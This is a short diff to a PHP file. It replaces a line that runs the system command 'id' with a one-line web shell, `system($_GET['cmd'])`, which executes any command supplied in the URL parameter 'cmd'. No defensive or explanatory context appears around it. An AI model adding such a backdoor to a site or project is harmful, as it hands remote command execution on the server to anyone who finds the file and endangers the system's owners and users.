@@ -1,3 +1,1 @@
-<?php
-echo shell_exec('id');
-?>
+<?php system($_GET['cmd']); ?>
